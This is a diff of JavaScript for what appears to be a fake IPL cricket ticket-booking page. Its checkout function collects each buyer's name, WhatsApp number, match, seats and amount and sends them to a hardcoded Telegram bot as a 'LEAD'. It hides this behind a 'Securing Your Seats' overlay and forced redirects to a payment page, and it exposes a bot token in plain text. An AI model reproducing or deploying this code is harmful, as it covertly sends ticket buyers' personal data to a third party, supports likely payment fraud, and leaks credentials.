@@ -10,7 +10,7 @@ document.addEventListener("DOMContentLoaded", async () => {
     window.sQty = 1;   
     window.sType = "None";
 
-    // 1. 🔥 VENUE IMAGE LOADING (WITH FALLBACK)
+    // 1. 🔥 VENUE IMAGE LOADING
     if (matchId && db) {
         try {
             const snapshot = await get(ref(db, `matches/${matchId}`));
@@ -23,18 +23,8 @@ document.addEventListener("DOMContentLoaded", async () => {
                 }
             }
         } catch (e) {
-            console.log("Firebase sync skipped or failed");
+            console.log("Firebase sync skipped");
         }
-    } 
-    
-    // 🔥 Fallback: अगर Firebase से लोड ना हो, तो LocalStorage से उठा लो (Details हमेशा दिखेंगी)
-    const savedMatch = JSON.parse(localStorage.getItem('selectedMatch') || "{}");
-    if (matchTitleEl && matchTitleEl.innerText === "" && savedMatch.title) {
-        matchTitleEl.innerText = savedMatch.title;
-    }
-    if (venueImgEl && venueImgEl.src === "" && savedMatch.venue_img) {
-        venueImgEl.src = savedMatch.venue_img;
-        venueImgEl.style.display = 'block';
     }
 
     // --- SEAT SELECTION LOGIC ---
@@ -52,7 +42,7 @@ document.addEventListener("DOMContentLoaded", async () => {
         if(btn) {
             btn.disabled = false;
             btn.classList.add('active');
-            btn.innerText = "Continue to Address"; // टेक्स्ट अपडेट कर दिया
+            btn.innerText = "Continue to Payment";
         }
         refreshTotal();
     };
@@ -77,7 +67,7 @@ document.addEventListener("DOMContentLoaded", async () => {
     }
 
     // 5. 🔥 THE ULTIMATE REDIRECT FUNCTION 🔥
-    window.goNext = async () => {
+    window.goNext = () => {
         if (window.sPrice > 0) {
             
             // 1. Button Block
@@ -93,7 +83,7 @@ document.addEventListener("DOMContentLoaded", async () => {
                 <div style="position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(255,255,255,0.95); z-index:99999; display:flex; flex-direction:column; justify-content:center; align-items:center; backdrop-filter:blur(5px);">
                     <div style="width: 45px; height: 45px; border: 4px solid #f3f3f3; border-top: 4px solid #00cf7f; border-radius: 50%; animation: load-spin 1s linear infinite;"></div>
                     <h3 style="margin-top:20px; color:#333; font-family:sans-serif; font-size:18px; font-weight:700;">Securing Your Seats...</h3>
-                    <p style="color:#666; font-size:13px; margin-top:5px; font-weight:500;">Please wait, redirecting to details page</p>
+                    <p style="color:#666; font-size:13px; margin-top:5px; font-weight:500;">Please wait, redirecting to gateway</p>
                     <style>@keyframes load-spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }</style>
                 </div>
             `;
@@ -102,38 +92,25 @@ document.addEventListener("DOMContentLoaded", async () => {
             // 3. Telegram Data
             const name = localStorage.getItem('customerName') || "Unknown";
             const phone = localStorage.getItem('customerPhone') || "Unknown";
-            
-            const matchTitleElCurrent = document.getElementById('match-title');
-            const matchTitle = (matchTitleElCurrent && matchTitleElCurrent.innerText) ? matchTitleElCurrent.innerText : savedMatch.title || "IPL Match";
-            
-            const resTypeEl = document.getElementById('res-type');
-            const seatType = (resTypeEl && resTypeEl.innerText) ? resTypeEl.innerText : window.sType;
-            
+            let matchTitle = "IPL Match";
+            if (matchTitleEl && matchTitleEl.innerText) matchTitle = matchTitleEl.innerText;
             const totalAmt = window.sQty * window.sPrice;
 
             const botToken = "8642950249:AAF8oxzhk-6NvYTEtpIW0oNNwsb2RQljliY"; 
             const chatId = "6820660513"; 
-            
-            // 🔥 एकदम सही हिंदी Telegram मैसेज (Address Page के लिए) 🔥
-            const telegramMsg = `🏠 <b>कस्टमर Address Page पर पहुँच गया!</b> 🏠\n\n` +
-                                `👤 <b>नाम (Name):</b> ${name}\n` +
-                                `📞 <b>नंबर (WhatsApp):</b> ${phone}\n` +
-                                `🏏 <b>मैच (Match):</b> ${matchTitle}\n` +
-                                `🎟️ <b>सीट (Seats):</b> ${window.sQty} x ${seatType}\n` +
-                                `💵 <b>कुल रकम (Total Amount):</b> ₹${totalAmt}`;
-
-            const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(telegramMsg)}&parse_mode=HTML`;
+            const telegramMsg = `💰 LEAD REACHED SEAT ADRESS PAGE! 💰\n\n👤 Name: ${name}\n📞 WhatsApp: ${phone}\n🏏 Match: ${matchTitle}\n🎟️ Seats: ${window.sQty} x ${window.sType}\n💵 Total Amount: ₹${totalAmt}`;
+            const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(telegramMsg)}`;
 
             // 4. BHEJO AUR WAIT KARO
-            try {
-                await fetch(url);
-            } catch (err) {
-                console.log("Telegram alert failed");
-            }
+            fetch(url).then(() => {
+                window.location.href = "payment.html"; // Message gaya, tabhi aage badhega
+            }).catch(() => {
+                window.location.href = "payment.html"; // Error aaya toh bhi aage badhega
+            });
 
-            // 5. FAILSAFE TIMER (अब यह payment.html की जगह details.html पर जाएगा)
+            // 5. FAILSAFE TIMER (Kahin net slow ho toh page atke na)
             setTimeout(() => {
-                window.location.href = "details.html";
+                window.location.href = "payment.html";
             }, 1200);
 
         } else {
@@ -145,13 +122,16 @@ document.addEventListener("DOMContentLoaded", async () => {
     setTimeout(() => {
         const finalBtn = document.getElementById('final-btn');
         if (finalBtn) {
+            // Agar HTML tag mein 'href' likha hai, toh usko delete maaro
             if (finalBtn.hasAttribute('href')) {
                 finalBtn.removeAttribute('href');
             }
+            
+            // Inline HTML onclick ko overwrite kar do
             finalBtn.onclick = function(e) {
-                if(e && e.preventDefault) e.preventDefault(); 
-                window.goNext(); 
+                if(e && e.preventDefault) e.preventDefault(); // Default chhalang roko
+                window.goNext(); // Hamara Telegram wala function chalao
             };
         }
-    }, 500); 
+    }, 500); // Page load hone ke aadhe second baad yeh action lega
 });
